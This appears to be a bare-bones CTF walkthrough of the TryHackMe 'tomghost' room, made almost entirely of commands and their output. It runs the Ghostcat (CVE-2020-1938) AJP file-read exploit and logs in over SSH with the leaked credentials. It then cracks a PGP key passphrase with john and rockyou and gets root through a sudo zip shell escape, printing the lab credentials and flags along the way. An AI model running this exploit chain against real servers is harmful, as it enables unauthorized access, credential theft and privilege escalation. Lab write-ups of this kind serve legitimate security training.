```
nmap
```

```
Source: https://github.com/0nise/CVE-2020-1938
python3 ajpShooter.py "http://10.10.70.48" 8009 /WEB-INF/web.xml read

skyfuck:g -> for ssh
```

```
ssh skyfuck@10.10.70.48

The authenticity of host '10.10.70.48 (10.10.70.48)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.70.48' (ECDSA) to the list of known hosts.
skyfuck@10.10.70.48's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 
```

```
skyfuck@ubuntu:/home$ cd merlin/
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
```

```
scp skyfuck@10.10.70.48:/home/skyfuck/* .
```

```
root@wuvel:/home/wuvel/Wuvel/CTF/TryHackMe/tomghost# gpg2john tryhackme.asc > hasil
root@wuvel:/home/wuvel/Wuvel/CTF/TryHackMe/tomghost# ls
credential.pgp  Ghostcat-CNVD-2020-10487  hasil  nmap  README.md  tryhackme.asc
root@wuvel:/home/wuvel/Wuvel/CTF/TryHackMe/tomghost#  john hasil --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2020-05-25 22:41) 10.00g/s 10720p/s 10720c/s 10720C/s marshall..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@wuvel:/home/wuvel/Wuvel/CTF/TryHackMe/tomghost# 
```

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: Invalid passphrase; please try again ...

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root
# ls
root.txt  ufw
# cat roo.txt
cat: roo.txt: No such file or directory
# cat root.txt
THM{Z1P_1S_FAKE}
```